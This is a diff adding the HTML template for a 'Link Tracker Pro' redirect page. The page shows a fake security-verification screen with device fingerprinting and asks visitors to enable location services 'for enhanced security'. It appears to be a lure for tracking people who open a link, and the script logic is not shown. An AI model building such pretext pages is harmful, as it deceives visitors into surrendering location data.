@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading... | Link Tracker Pro</title>
+    <link rel="stylesheet" href="main.css">
+    <link rel="stylesheet" href="redirect.css">
+</head>
+<body>
+    <div class="redirect-container">
+        <div class="redirect-header">
+            <div class="logo">LinkTracker</div>
+            <div class="security-badge">
+                <i class="icon-lock"></i> Secure Connection
+            </div>
+        </div>
+
+        <div class="redirect-content">
+            <!-- Loading State -->
+            <div id="loading-section" class="state-section">
+                <div class="loader-container">
+                    <div class="loader"></div>
+                    <div class="loader-text">Verifying your access</div>
+                </div>
+                <h1>Just a moment...</h1>
+                <p>We're verifying your request to ensure security</p>
+
+                <div class="verification-container" id="verification-container">
+                    <h3><i class="icon-shield"></i> Security Verification</h3>
+                    <p>Our system is analyzing your device for security purposes</p>
+                    
+                    <div class="verification-steps">
+                        <div class="verification-step">
+                            <div class="verification-icon pending" id="step-bot">
+                                <i class="icon-bot"></i>
+                            </div>
+                            <div class="verification-text">Bot Detection</div>
+                        </div>
+                        <div class="verification-step">
+                            <div class="verification-icon pending" id="step-behavior">
+                                <i class="icon-activity"></i>
+                            </div>
+                            <div class="verification-text">Behavior Analysis</div>
+                        </div>
+                        <div class="verification-step">
+                            <div class="verification-icon pending" id="step-fingerprint">
+                                <i class="icon-fingerprint"></i>
+                            </div>
+                            <div class="verification-text">Device Fingerprinting</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Expired State -->
+            <div id="expired-section" class="state-section hidden">
+                <div class="status-icon error">
+                    <i class="icon-clock"></i>
+                </div>
+                <h1>Link Expired</h1>
+                <p>This tracking link is no longer active</p>
+                <div class="action-buttons">
+                    <button class="btn btn-secondary">
+                        <i class="icon-home"></i> Return Home
+                    </button>
+                </div>
+            </div>
+
+            <!-- Location Required -->
+            <div id="location-required-section" class="state-section hidden">
+                <div class="status-icon warning">
+                    <i class="icon-map-pin"></i>
+                </div>
+                <h1>Location Required</h1>
+                <p>To continue, please enable location services for enhanced security</p>
+                
+                <div class="location-permission">
+                    <button id="request-location-btn" class="btn btn-primary">
+                        <i class="icon-map"></i> Enable Location
+                    </button>
+                    <p class="location-terms">
+                        <i class="icon-info"></i> Your location data will only be used for security purposes
+                    </p>
+                </div>
+                <p id="location-error" class="error-message hidden"></p>
+            </div>
+
+            <!-- Redirecting State -->
+            <div id="redirect-section" class="state-section hidden">
+                <div class="status-icon success">
+                    <i class="icon-check"></i>
+                </div>
+                <h1>Redirecting You</h1>
+                <p>You're being securely redirected to the destination</p>
+                <div class="loader-container small">
+                    <div class="loader"></div>
+                </div>
+                <p id="custom-message" class="custom-message"></p>
+            </div>
+        </div>
+
+        <div class="redirect-footer">
+            <p>Protected by LinkTracker Pro Security</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="redirect.js"></script>
+</body>
+</html>
